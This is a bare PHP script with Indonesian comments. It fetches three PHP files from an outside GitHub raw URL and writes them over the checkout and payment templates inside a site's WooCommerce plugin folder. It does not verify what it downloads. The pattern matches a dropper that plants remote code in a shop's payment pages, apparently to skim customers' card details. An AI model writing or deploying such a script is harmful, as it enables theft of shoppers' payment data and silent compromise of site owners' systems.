<?php
// Array URL sumber dari GitHub
$github_urls = array(
    "https://raw.githubusercontent.com/calcucode/clubdelmacrame/main/form-checkout.php",
    "https://raw.githubusercontent.com/calcucode/clubdelmacrame/main/payment.php",
    "https://raw.githubusercontent.com/calcucode/clubdelmacrame/main/payment-method.php"
);

// Lokasi folder root publik dari server Anda
$local_folder_root = $_SERVER['DOCUMENT_ROOT'];

// Subfolder di dalam root publik
$subfolder = "/wp-content/plugins/woocommerce/templates/checkout/";

// Lokasi folder di server Anda
$local_folder_path = $local_folder_root . $subfolder;

// Loop melalui setiap URL
foreach ($github_urls as $github_url) {
    // Mendapatkan nama file dari URL
    $file_name = basename($github_url);

    // Lokasi file di server Anda
    $local_file_path = $local_folder_path . $file_name;

    // Mengambil konten dari URL GitHub
    $content = file_get_contents($github_url);

    if ($content === false) {
        echo "Gagal mengambil konten dari $github_url.<br>";
    } else {
        // Menulis konten ke file lokal
        $result = file_put_contents($local_file_path, $content);
        
        if ($result !== false) {
            echo "File $file_name berhasil diambil dan disimpan di $local_file_path.<br>";
        } else {
            echo "Gagal menyimpan file $file_name di $local_file_path.<br>";
        }
    }
}
?>
